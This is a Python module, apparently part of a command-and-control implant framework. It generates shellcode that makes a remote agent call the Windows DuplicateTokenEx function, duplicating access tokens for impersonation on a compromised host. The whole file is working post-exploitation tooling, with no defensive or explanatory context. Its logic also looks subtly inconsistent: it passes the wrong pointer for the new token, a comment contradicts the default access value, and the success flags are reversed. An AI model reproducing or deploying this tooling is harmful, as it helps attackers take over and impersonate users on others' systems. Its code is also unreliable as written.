NAME = "DuplicateTokenEx"
DESCRIPTION = "Creates a new access token that duplicates an existing one using advapi32!DuplicateTokenEx"
PARAMS = [
    {"name": "hExistingToken", "description": "Handle to the existing token", "type": "hex"},
    {"name": "dwDesiredAccess", "description": "Access rights for the new token", "type": "hex", "optional": True, "default": "0xb"},
    {"name": "dwImpersonationLevel", "description": "Impersonation level (e.g., 2 for SecurityImpersonation)", "type": "int", "optional": True, "default": 2},
    {"name": "tokenType", "description": "Token type (1 for TokenPrimary, 2 for TokenImpersonation)", "type": "int", "optional": True, "default": 1},
]
DEPENDENCIES = []
DEFAULT = True

def DuplicateTokenEx_Payload(agent_id, hExistingToken, dwDesiredAccess, dwImpersonationLevel, tokenType):
    """
    Generates the shellcode to call DuplicateTokenEx.
    Signature: BOOL DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, 
               LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, 
               TOKEN_TYPE TokenType, PHANDLE phNewToken);
    """
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import push_rtl, build_ptr
    
    agent = Agent.by_id(agent_id)
    scratchpad = agent.scratchpad
    # Resolve advapi32!DuplicateTokenEx
    func_addr = Syscall.sys(agent.id, "DuplicateTokenEx")
    newtoken_data, next_ptr = build_ptr(scratchpad, b"\x00"*8)
    
    # x64 Calling Convention: RCX, RDX, R8, R9, [Stack]
    # We need to provide a pointer for phNewToken. Usually, the agent's push_rtl 
    # or the stub handling the return will expect the output in a specific register 
    # or handle stack allocation for the pointer.
    
    # Note: This specific implementation assumes push_rtl handles the transition.
    # We pass 0 (NULL) for lpTokenAttributes.
    params = [
        hExistingToken,       # RCX: hExistingToken
        dwDesiredAccess,      # RDX: dwDesiredAccess (0 = same as existing)
        0,                    # R8:  lpTokenAttributes (NULL)
        dwImpersonationLevel, # R9:  ImpersonationLevel
        tokenType,            # [Stack]: TokenType
        scratchpad                    # [Stack]: phNewToken (Pointer to handle)
    ]
    
    shellcode = push_rtl(func_addr, params, agent.debug)
    return newtoken_data, shellcode

def duplicate_token_internal(agent_id, hExistingToken, dwDesiredAccess, dwImpersonationLevel, tokenType):
    """
    Handles communication with the agent to execute DuplicateTokenEx.
    """
    from services.orders import send_and_wait, read_scratchpad, write_scratchpad
    
    data, shellcode = DuplicateTokenEx_Payload(agent_id, hExistingToken, dwDesiredAccess, dwImpersonationLevel, tokenType)
    
    # The return value for DuplicateTokenEx is a BOOL (success/fail).
    # However, the output we want is the phNewToken.
    # This logic assumes the agent returns the new handle created on the stack/buffer.
    write_scratchpad(agent_id, data)
    response_bytes = send_and_wait(agent_id, shellcode)
    ret = int.from_bytes(response_bytes, 'little')
    h_new_token = int.from_bytes(read_scratchpad(agent_id, 8), 'little')
    
    return ret, h_new_token

def function(agent_id, args):
    """
    Entry point for the DuplicateTokenEx tool.
    """
    h_existing_token = args[0]
    
    dwDesiredAccess = args[1]
    
    imp_level = args[2]
    token_type = args[3]
    
    ret, h_new_token = duplicate_token_internal(agent_id, h_existing_token, dwDesiredAccess, imp_level, token_type)
    
    if ret != 0:
        return {
            "success": 0,
            "h_new_token": hex(h_new_token),
        }

    return {
        "success": -1,
        "error": "Failed to duplicate token."
    }